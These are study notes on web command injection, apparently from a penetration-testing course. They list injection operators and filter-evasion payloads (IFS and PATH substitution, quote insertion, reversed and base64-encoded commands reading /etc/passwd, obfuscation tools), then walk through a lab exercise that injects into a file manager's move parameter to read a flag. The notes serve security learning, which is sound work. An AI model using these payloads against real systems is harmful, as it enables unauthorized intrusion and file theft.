# Command Injections

1. [Exploitation](#exploitation)
1. [Filter Evasion](#filter-evasion)
1. [Skills Assessment](#skills-assessment)

## Exploitation

* Command injections - user input goes into a web query that executes system commands; due to improper input sanitization

* To inject an additional command to the intended one, we can try using the following operators (both or either of commands get executed) - URL-encoded characters can be tried:

  * ```;``` (%3b)
  * ```\n``` (%0a)
  * ```&``` (%26)
  * ```|``` (%7c)
  * ```&&``` (%26%26)
  * ```||``` (%7c%7c)
  * `` (%60%60) (only on Linux for sub-shell)
  * ```$()``` (%24%28%29) (only on Linux for sub-shell)

* Bypassing front-end validation - we can intercept the requests using Burp Suite or ZAP, and modify the payload by injecting the command, and URL-encoding it.

## Filter Evasion

* Identifying filters:

  * During our command injection attempt, if we get error message in the output field itself, it means it was detected & prevented by the web app itself; it the error is displayed in a different page with additional information, it could indicate a WAF (web app firewall)

* Bypassing blacklisted characters:

  * first we need to identify which characters are blacklisted; add/replace chars (or URL-encode them) one-by-one to payload for input testing

  * [to bypass blacklisted space char](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space), we can use tabs (%09), ```${IFS}```, or brace expansion feature (e.g. - {ls, la} - adds space automatically between arguments)

  * example payload - ```127.0.0.1%0a%09{ls,-la}``` - includes newline, tab and brace expansion

  * we can bypass slash filter using Linux env variables; using ```${PATH:0:1}``` fetches the first char of ```PATH``` env variable, which is '/'

  * similarly, for semi-colon we can use ```${LS_COLORS:10:1}```, and ```${IFS}``` for space

  * we can follow the same technique for Windows CMD and PowerShell, but the payloads would differ

  * character shifting - we can find the next character in ASCII table, and shift character by 1:

    ```shell
    man ascii
    # ';' is 073, while ':' is 072

    echo $(tr '!-}' '"-~'<<<:)
    # this gives ';'
    ```

  * for example, if we want to inject command ```ls /home```, we can use the payload ```127.0.0.1%0a%09ls%09${PATH:0:1}home``` (%0a for newline, %09 for tab or space, and PATH env variable first char for slash)

* Bypassing blacklisted commands:

  * insert certain characters within command that are usually ignored by Bash, PowerShell, like ```'``` and ```"```; so within the payload, our command can be something like ```w'h'o'am'i``` or ```w"ho"a"m"i``` - we cannot mix types of quotes and number of quotes must be even

  * for Linux-only shells, we can use other characters in middle of commands, like ```\``` and ```$@```; in this case, the number of characters do not have to be even. For example - ```who$@ami```, ```w\ho\am\i```

  * for Windows-only shells, we can use other characters such as ```^``` in the middle of the command string

* Advanced command obfuscation:

  * Case manipulation:

    * inverting character cases or alternating between cases; works when command blacklist does not check for case variations
    * Windows (CMD and PowerShell) systems are case-insensitive, while Linux systems are case-sensitive with respect to commands:

      ```shell
      # for Linux

      # this uses alternating case, but we convert it to lowercase with tr
      $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

      # another command to convert to lowercase
      $(a="WhOaMi";printf %s "${a,,}")
      
      # for command injection, we would need to modify payload by replacing spaces with %09
      ```
  
  * Reversed commands:

    ```shell
    # in Linux
    # reverse the string
    echo 'whoami' | rev

    # execute original command by reversing it back in sub-shell
    $(rev<<<'imaohw')
    # <<< is used instead of |
    ```

    ```ps
    # in Windows
    "whoami"[-1..-20] -join ''
    # gives reversed string

    iex "$('imaohw'[-1..-20] -join '')"
    # reverse the string again and execute command
    ```
  
  * Encoded commands:

    * useful for commands containing filtered chars or chars that can be URL-decoded by server

    ```shell
    echo -n 'cat /etc/passwd | grep 33' | base64
    # encode payload which includes filtered chars

    bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
    # command that will decode string in subshell and pass it to bash for executing

    # besides base64, for encoding we can also check openssl or hex, for example
    ```

    ```ps
    # in Windows
    [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
    # base64 encoding

    iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
    # decode string and execute payload
    ```

* Evasion tools:

  * [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator):

    ```shell
    # for obfuscating bash commands
    ./bashfuscator -c 'cat /etc/passwd'
    # randomly generates payload, can increase payload size

    ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
    # using flags to limit payload size and other params

    bash -c '<obfuscated payload>'
    # this executes the command
    ```
  
  * [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation):

    ```ps
    Invoke-DOSfuscation
    # interactive PowerShell module
    # we can interact and create payload

    # once payload is ready, just paste it in CMD to test
    ```

## Skills Assessment

* We are given access to a website with login creds as well.

* Logging in, we can see a file manager functionality; we would have to detect the point where command can be injected first.

* While exploring the page and its different utilities, we can use Burp Suite to capture and intercept these requests, in order to find where a command is probably executed from system - to check where our input can be given.

* We have the 'move' function in the file manager - intercepting the request and viewing the response, we can see the message ```Error while moving: mv: cannot stat '/var/www/html/files/51459716.txt': No such file or directory```.

* This error message shows that ```mv``` in Linux is being used here in the backend; we can try to exploit this.

* The URL is in the format - ```/index.php?to=tmp&from=51459716.txt&finish=1&move=1``` - we can attempt to inject at the end of the ```from``` parameter.

* Already, we can see that ```&``` is part of the URL, and it is also a possible character used in command injection; but we can test with all characters and see which one works.

* For the wrong characters, we get a ```Malicious request denied``` message; we do not get that message when we add the ```&``` character - ```/index.php?to=tmp&from=787113764.txt&&finish=1&move=1 HTTP/1.1```

* However, we cannot inject any command after that without adding tab (```%09```), so we will have to use their URL-encoded forms while making the request - ```/index.php?to=tmp&from=787113764.txt%26%09&finish=1&move=1```

* This gives us an error for ```mv``` - 'missing destination file operand' - this means we are on the right track.

* Trying to inject the command ```ls``` - ```/index.php?to=tmp&from=787113764.txt%26%09ls&finish=1&move=1``` - this gives us a 'Malicious request denied' error again, so we will have to obfuscate this further

* Single quotes don't work, but double quotes do, and we would have to keep it to an even number - ```/index.php?to=tmp&from=787113764.txt%26%09l""s&finish=1&move=1``` - this prints the list of files as expected

* To print list of files in root directory, we would have to use slash, but in obfuscated manner - ```/index.php?to=tmp&from=787113764.txt%26%09l""s%09${PATH:0:1}&finish=1&move=1```

* To print the content of the file - ```/index.php?to=tmp&from=787113764.txt%26%09c""at%09${PATH:0:1}flag.txt&finish=1&move=1```
